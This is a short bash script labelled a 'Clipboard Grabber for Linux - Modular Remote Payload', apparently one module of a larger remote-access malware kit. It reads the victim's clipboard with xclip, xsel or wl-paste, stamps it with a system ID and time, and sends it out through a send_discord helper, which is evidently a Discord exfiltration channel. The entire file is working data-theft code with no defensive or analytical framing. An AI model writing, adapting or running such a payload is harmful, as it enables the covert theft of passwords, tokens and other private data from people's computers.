#!/bin/bash
# ============================================================
# Clipboard Grabber for Linux - Modular Remote Payload
# ============================================================

SYSID=$(get_sysid)
OUTPUT="📋 **Clipboard from $SYSID**\n"
OUTPUT+="📅 $(date '+%Y-%m-%d %H:%M:%S')\n"
OUTPUT+="========================================\n"

# Try different clipboard tools
CLIP=""

if command -v xclip &>/dev/null; then
    CLIP=$(xclip -selection clipboard -o 2>/dev/null)
elif command -v xsel &>/dev/null; then
    CLIP=$(xsel --clipboard --output 2>/dev/null)
elif command -v wl-paste &>/dev/null; then
    # Wayland
    CLIP=$(wl-paste 2>/dev/null)
fi

if [[ -n "$CLIP" ]]; then
    # Truncate if too long
    if [[ ${#CLIP} -gt 1800 ]]; then
        CLIP="${CLIP:0:1800}... (truncated)"
    fi
    OUTPUT+="\`\`\`$CLIP\`\`\`"
else
    OUTPUT+="⚠️ Clipboard empty or no clipboard tool available\n"
    OUTPUT+="Tried: xclip, xsel, wl-paste"
fi

send_discord "$OUTPUT"

